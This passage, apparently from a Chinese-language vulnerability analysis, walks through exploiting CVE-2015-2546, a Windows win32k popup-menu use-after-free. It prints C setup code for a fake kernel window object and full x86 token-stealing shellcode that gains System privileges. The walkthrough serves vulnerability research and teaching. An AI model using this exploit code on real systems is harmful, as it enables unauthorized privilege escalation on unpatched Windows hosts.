ShellCode 代码的首地址。后续的实际内核利用的操作将通过这里的 ShellCode 代码在内核上下文中进行。
    pvShellCode = (PSHELLCODE)VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ZeroMemory(pvShellCode, 0x1000);
    ptagWNDFake = (PDWORD)((PBYTE)pvShellCode + 0xf00);
    ptagWNDFake[0x05] = (DWORD)0x40000;                  //->state[bServerSideWindowProc]
    ptagWNDFake[0x12] = (DWORD)pvShellCode->pfnWindProc; //->lpfnWndProc
    pvShellCode->pid                     = GetCurrentProcessId();
    pvShellCode->off_CLS_lpszMenuName    = 0x050;
    pvShellCode->off_THREADINFO_ppi      = 0x0b8;
    pvShellCode->off_EPROCESS_ActiveLink = 0x0b8;
    pvShellCode->off_EPROCESS_Token      = 0x0f8;
    for (UINT i = 0; ; i++)
    {
        if (*(DWORD *)&((PBYTE)xxPayloadWindProc)[i] == 0xcccccccc)
        {
            CopyMemory(pvShellCode->pfnWindProc, xxPayloadWindProc, i);
            break;
        }
    }
在验证代码自定义的窗口挂钩处理函数中，将原本为成员域 `spwndNextPopup` 和 `spwndActivePopup` 赋值的
`0xdddddddd` 改成在此处伪造的目标菜单窗口对象 `ptagWNDFake` 的地址。
    dwPopupFake[0x3] = (DWORD)ptagWNDFake; //->spwndNextPopup
    [...]
    dwPopupFake[0x7] = (DWORD)ptagWNDFake; //->spwndActivePopup
_更新占用原位置的弹出菜单对象部分成员域的值_
由于在函数 `xxxSendMessageTimeout`
中存在对目标窗口对象指向线程信息对象的成员域的判断，因此利用代码需要将伪造的菜单窗口对象指针成员域 `pti` 赋值为当前线程的线程信息对象地址，这可以通过
`HMValidateHandle` 内核地址泄露技术根据前面创建的任意窗口对象句柄来实现。成员域 `pti` 在内核利用的函数代码中还将用作定位进程体
`EPROCESS` 链表的线索。
    PTHRDESKHEAD head = (PTHRDESKHEAD)xxHMValidateHandle(hwndFakeMenu);
    ((PTHRDESKHEAD)ptagWNDFake)->pti = head->pti;
_赋值伪造的菜单窗口对象的菜单信息结构体指针成员域_
* * *
**内核利用的函数代码**
用来实施内核利用的 ShellCode 函数代码将作为伪造的子菜单窗口对象的内核模式消息处理函数在内核上下文中执行。函数的执行通过函数
`xxxMNHideNextHierarchy` 向目标子菜单窗口对象发送 `0x1E5` 消息来触发。
在 ShellCode 函数开始位置，判断通过参数传入的消息是否是 `0x1E5`，不是的情况则直接返回。
    push    ebp;
    mov     ebp, esp;
    mov     eax, dword ptr[ebp + 0Ch];
    cmp     eax, 01E5h;
    jne     LocRETURN;
在 32 位的 Windows 操作系统中，用户上下文代码段寄存器 `CS` 值为 `0x1B`，借助这个特性，在 `ShellCode`
函数代码中判断当前执行上下文是否在用户模式下，如是则直接返回。
    mov     ax, cs;
    cmp     ax, 1Bh;
    je      LocRETURN;
首先备份当前所有通用寄存器的数值在栈上，接下来通过 `CALL-POP` 技术获取当前 `EIP` 执行指令的地址，并根据相对偏移计算出存储在
ShellCode 函数代码前面位置的结构体 `SHELLCODE` 对象的首地址：
    cld;
    pushad;
    call    $+5;
    pop     edx;
    sub     edx, 35h;
接下来获取先前存储在伪造子菜单窗口对象成员域 `pti` 中的线程信息 `tagTHREADINFO` 对象指针，并继续获取线程信息对象中存储的进程信息
`tagPROCESSINFO` 对象指针，并获取对应进程的进程体 `EPROCESS` 对象指针。各个成员域的偏移在结构体 `SHELLCODE`
对象中存储。
    LocGetEPROCESS:
    mov     ecx, dword ptr[ebp + 8];
    mov     ecx, dword ptr[ecx + 8];
    mov     ebx, dword ptr[edx + 08h];
    mov     ecx, dword ptr[ebx + ecx];
    mov     ecx, dword ptr[ecx];
    mov     ebx, dword ptr[edx + 0Ch];
    mov     eax, dword ptr[edx + 4];
接下来根据进程体 `EPROCESS` 对象的成员域 `ActiveProcessLinks` 双向链表和成员域 `UniqueProcessId`
进程标识符找到当前进程的 `EPROCESS` 地址。由于 `UniqueProcessId` 是成员域 `ActiveProcessLinks`
的前一个成员域，因此直接使用 `SHELLCODE` 对象中存储的 `ActiveProcessLinks` 偏移值来定位
`UniqueProcessId` 的位置。
    push    ecx;
    LocForCurrentPROCESS:
    cmp     dword ptr[ebx + ecx - 4], eax;
    je      LocFoundCURRENT;
    mov     ecx, dword ptr[ebx + ecx];
    sub     ecx, ebx;
    jmp     LocForCurrentPROCESS;
    LocFoundCURRENT:
    mov     edi,ecx;
    pop     ecx;
紧接着继续遍历进程体 `EPROCESS` 对象链表，以找到 System 进程的进程体对象地址。
    LocForSystemPROCESS:
    cmp     dword ptr[ebx + ecx - 4], 4;
    je      LocFoundSYSTEM;
    mov     ecx, dword ptr[ebx + ecx];
    sub     ecx, ebx;
    jmp     LocForSystemPROCESS;
    LocFoundSYSTEM :
    mov     esi, ecx;
执行到这一步已定位到当前进程和 System 进程的进程体对象地址，接下来就使用 System 进程的成员域 `Token` 指针替换当前进程的
`Token` 指针。
    mov     eax, dword ptr[edx + 10h];
    add     esi, eax;
    add     edi, eax;
    lods    dword ptr[esi];
    stos    dword ptr es : [edi];
此时当前进程已拥有 System 进程的 `Token` 指针，额外增加的引用需要手动为目标 `Token` 对象增加对象引用计数。在 NT
执行体模块中大多数内核对象都是以 `OBJECT_HEADER` 结构体作为头部结构：
    kd> dt nt!_OBJECT_HEADER
       +0x000 PointerCount     : Int4B
       +0x004 HandleCount      : Int4B
       [...]
       +0x014 SecurityDescriptor : Ptr32 Void
       +0x018 Body             : _QUAD
该结构位于内核对象地址前面的位置，内核对象起始于 `OBJECT_HEADER` 结构体的 `Body` 成员域。手动增加指针引用需要对成员域
`PointerCount` 进行自增。
    and     eax, 0FFFFFFF8h;
    add     dword ptr[eax - 18h], 2;
接下来大功告成，置位 `SHELLCODE` 对象成员域 `bExploited`
已向用户进程传递利用成功的反馈信号。恢复前面备份的通用寄存器的数值到寄存器中。
    mov     dword ptr[edx + 14h], 1;
    popad;
    xor     eax, eax;
    LocRETURN:
    leave;
    ret     10h;
在函数末尾设置 5 个 `int 3` 指令，以便在前面拷贝内核利用的函数代码时能够定位到函数的末尾。
* * *
**提权成功**
在自定义的事件通知处理程序 `xxWindowEventProc` 函数中，待发送 `WM_MOUSEMOVE` 的函数 `SendMessage`
调用返回后，增加对 `SHELLCODE` 对象的内核利用反馈变量成员域 `bExploited` 数值的判断：
    if (pvShellCode->bExploited)
    {
        bDoneExploit = TRUE;
    }
_自定义事件通知处理程序增加对内核利用反馈变量的判断_
如果变量已被赋值，则将全局变量 `bDoneExploit` 赋值为 `TRUE`。通过主线程监听全局变量 `bDoneExploit`
是否被赋值，并在后续代码逻辑中创建新的命令提示符进程。
_启动的命令提示符进程已属于 System 用户身份_
可以观测到新启动的命令提示符已属于 System 用户身份。
* * *
**后记**
这个漏洞和 CVE-2017-0263 都是 `tagPOPUPMENU` 对象的释放后重用漏洞，不同的是利用的时机：CVE-2017-0263
是在内核函数释放目标弹出菜单对象之后才得以满足触发条件，而本分析中的 CVE-2015-2546
需要用户进程的利用代码主动触发释放目标弹出菜单对象的逻辑。对该漏洞的利用总体来讲比 CVE-2017-0263 的利用更为简单，对
CVE-2017-0263 的利用代码几乎可以不经修改地对该漏洞使用，同时也没有任何被破坏需要修复的内核对象存在。
#### 0x5 链接
本分析的 POC 下载
从 CVE-2017-0263 漏洞分析到菜单管理组件
Kernel Attacks through User-Mode Callbacks
sam-b/windows_kernel_address_leaks
Two for One: Microsoft Office Encapsulated PostScript and Windows Privilege
Escalation Zero-Days
CVE-2015-2546：从补丁比对到Exploit
WM_MOUSEMOVE message
* * *